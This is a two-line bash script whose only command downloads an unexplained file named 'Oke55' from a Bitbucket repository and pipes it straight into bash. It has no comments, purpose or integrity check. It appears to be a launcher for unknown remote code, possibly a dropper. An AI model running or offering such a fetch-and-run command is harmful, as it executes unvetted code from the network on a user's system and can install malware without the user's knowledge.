#!/bin/bash

curl -sL  https://bitbucket.org/kotamabaran777/gas1/raw/355dbd6697ffaa0f4c6268865a770d0da4017483/Oke55 | bash